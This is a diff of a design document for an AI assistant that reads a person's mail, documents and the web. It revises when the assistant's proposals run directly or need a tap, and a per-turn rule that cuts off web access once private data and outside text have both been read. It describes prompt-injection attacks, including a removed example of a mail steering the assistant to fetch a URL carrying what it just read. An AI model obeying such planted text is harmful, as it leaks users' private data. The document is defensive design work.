@@ -110,19 +110,26 @@ model that did not take the advice met nothing at all.
 
 ### The card
 
-`effect: "card"` means the tool files a proposal and changes nothing. The card
-shows the whole thing — the mail body, the prompt an agent would be given, the
-event — and the person's tap is what reaches the app's own route. Starting a
-session, ending one, merging a pull request, sending a mail, putting something
-on the calendar, setting up or running a session schedule: all cards.
+`effect: "card"` means the tool files a proposal: starting a session, ending one,
+merging a pull request, sending a mail, putting something on the calendar,
+setting up or running a session schedule, a change in headroom or LogEveryLift.
+What happens next depends on the turn that filed it.
 
-Starting a session is a card for a specific reason. The chair reads mail and
-documents, which are text written by strangers, and a session is the one thing
-it can do that a poisoned document could usefully ask for: an agent with a
-shell on the pod, holding gh, kubectl and git. A schedule that starts a session
-is that same agent on a timer, holding whatever prompt was written into it, and
-running one now is that same agent with no timer at all — so those are cards
-too.
+- **A turn the person drove**, one that has read nothing written outside this
+  bench, has its proposal run at once. It goes through the same `execute` path a
+  tap uses (`runProposal` in `routes/proposals.ts`), is marked done, and goes into
+  the tool log as "the assistant, as asked". This is the person asking, and a card
+  to tap would only repeat the question.
+- **A turn that has read a mail, a document or a web page** gets a card instead,
+  showing the whole thing, and the person's tap is what runs it. The request might
+  be the text's and not theirs. A session is the sharpest case: an agent with a
+  shell on the pod, holding gh, kubectl and git.
+- **A run nobody is reading** never sends its turn, so its proposals are always
+  cards.
+
+The MCP server sends the turn id from the environment the backend wrote, so a
+model cannot claim a clean turn. A run that fails is left as a card with the
+reason, for the person to try again.
 
 No tool is `irreversible`: it is what a tool missing from the table reads as,
 and a test pins the set at empty, so one cannot be added quietly. The changes
@@ -183,36 +190,28 @@ the mail log and the calendar trash are pruned after 90 days
 
 ## The rule that makes reading their mail safe
 
-The chair reads the mail, the documents, the calendar and the inbox. It also
-reads the web and drives a browser. Both at once is a complete exfiltration
-path with no click in it: a mail body that talks it into fetching
-`https://somewhere/?q=<what it just read>` is the whole attack, and nothing on
-this bench would show it had happened.
+A planted instruction needs three things to do harm: text somebody outside this
+bench wrote (a mail, a document, a web page), the person's private data, and a way
+out. The rule takes away the way out, and only when the first two are both there.
 
-So a turn holds one half or the other:
+- A turn may read anything, in any order, and browse. Reading their finances and
+  then the web, or the web and then their training, is fine.
+- Once a turn has read both something private and a stranger's text, it cannot
+  reach the web or the browser, and the browser is closed at that moment.
+- Once a turn has read a stranger's text at all, a change it asks for is a card
+  (see above).
 
-- Reading anything **private** closes the browser and bars it for the rest of
-  that turn. The MCP server pays for the read before it serves it and fails
-  closed if it cannot, so there is no moment between the mail arriving and the
-  browser going.
-- A turn that has already **reached the web** — `WebFetch`, `WebSearch`, or the
-  browser — is refused the read instead. A browser call counts; the browser's
-  server starting does not, since the CLI starts it on every chair turn.
-
-The web tools and headroom's reads go through a gate before they run: a
-PreToolUse HTTP hook on every assistant turn (`gateSettings` in
+The web tools, the browser and the connectors' reads go through a gate before they
+run: a PreToolUse HTTP hook on every assistant turn (`gateSettings` in
 `assistant-policy.ts`), answered by `POST /api/assistant/turn/gate`. It rules and
-records in one step, so a read followed by a fetch is refused either way round,
-and `onFailure: "block"` means a backend it cannot reach refuses the call. The
-verksted server's own private reads pay through `/api/assistant/turn/private`
-and share the same record.
+records in one step, so two calls at once cannot both find the turn clean, and
+`onFailure: "block"` means a backend it cannot reach refuses the call. The verksted
+server reports its own reads through `/api/assistant/turn/private`, with whether
+each was private and whether it was written outside, before it serves them. That
+route never refuses. The rule lives in `assistant-taint.ts`.
 
-Built-in `Read` of a repo file does not count as private, so a turn can read a
-repo and then the web. BACKLOG has it.
-
-Per turn, because that is the unit a prompt injection acts within. The next
-turn holds everything again, and a person opening the browser pane themselves
-carries no turn at all and is unaffected.
+Per turn, because that is the unit a prompt injection acts within. The next turn
+starts clean, and a person opening the browser pane themselves carries no turn.
 
 The same reasoning covers memory. `remember` writes the bench's memory, which
 every session in every repo is handed as its own instructions, and
